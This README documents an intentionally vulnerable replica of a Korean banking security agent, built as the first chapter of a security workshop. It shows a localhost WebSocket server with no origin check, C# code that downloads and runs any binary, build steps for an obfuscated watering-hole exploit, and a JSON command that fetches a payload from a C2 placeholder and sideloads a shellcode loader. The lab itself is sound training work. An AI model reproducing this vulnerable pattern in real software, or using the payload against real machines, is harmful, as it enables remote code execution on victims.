# Financial Security Software I

Intentionally vulnerable replica of a Korean financial security agent. Mimics the real-world pattern where banking/gov sites force-install client-side security programs that listen on localhost. The agent opens a WebSocket on `ws://127.0.0.1:4441` with no origin validation  - any webpage can connect and send commands, including one that downloads and executes arbitrary binaries.

This is the initial access vector for the Operation Triple Barrel workshop (Chapter 1).

## Requirements

- [.NET 9 SDK](https://dotnet.microsoft.com/en-us/download/dotnet/9.0) (Windows x64 installer)
- [Node.js 18+](https://nodejs.org/en/download) (includes npm; for exploit build only)

## Build

```bash
# Agent
cd FssAgent
dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true

# Exploit (obfuscate + inject into HTML)
cd exploit
npm install
npm run build
```

## Usage

**1. Start the agent:**

```bash
cd FssAgent
dotnet run
```

Agent starts on `ws://127.0.0.1:4441`, no arguments needed.

**2. Serve the watering hole page:**

```bash
cd exploit
python -m http.server 8080
```

**3. Victim visits** `http://<attacker>/wateringhole.html` in their browser. The page silently connects to the agent and sends:

```json
{"cmd":"update", "url":"<C2>/payload", "path":"C:\\ProgramData\\imonclient", "exec":"printfilterpipelinesvc.exe"}
```

The agent downloads the payload, extracts it, and executes `printfilterpipelinesvc.exe`, which sideloads `mscoree.dll` (the shellcode loader from Chapter 2).

## Vulnerability

The agent's WebSocket server accepts connections from any origin. The `update` command downloads from an attacker-controlled URL, writes to an attacker-controlled path, and executes an attacker-specified binary.

**No origin check**  - `WebSocketServer.cs`:

```csharp
// accepts ANY WebSocket connection, no Origin header validation
if (context.Request.IsWebSocketRequest)
{
    _ = HandleConnectionAsync(context, ct);
}
```

**Arbitrary download + execute**  - `CommandHandler.cs`:

```csharp
private async Task[[ORCA_RICH_MD:d1dc2433fa08e0a5906456c9a3b141bc:inline-html:%3Cstring%3E]] HandleUpdateAsync(JsonElement root)
{
    var url = urlProp.GetString()!;   // attacker-controlled URL
    var path = pathProp.GetString()!; // attacker-controlled path
    var exec = execProp.GetString()!; // attacker-controlled binary name

    Directory.CreateDirectory(path);                    // create any directory
    var ok = await Downloader.DownloadAsync(url, path); // download from anywhere

    Process.Start(new ProcessStartInfo                  // execute anything
    {
        FileName = execPath,
        WorkingDirectory = path,
        UseShellExecute = false
    });
}
```

**What's missing:** origin allowlist, URL allowlist, code signing verification, path validation. That's the vuln  - by design.

## Agent Commands


| Command       | Description                                                    |
| ------------- | -------------------------------------------------------------- |
| `getVersion`  | Returns agent version (`3.3.2.41`)                             |
| `getStatus`   | Returns running modules                                        |
| `getCertInfo` | Returns fake KISA certificate info                             |
| `update`      | **The vulnerability**  - downloads URL to path, executes binary |


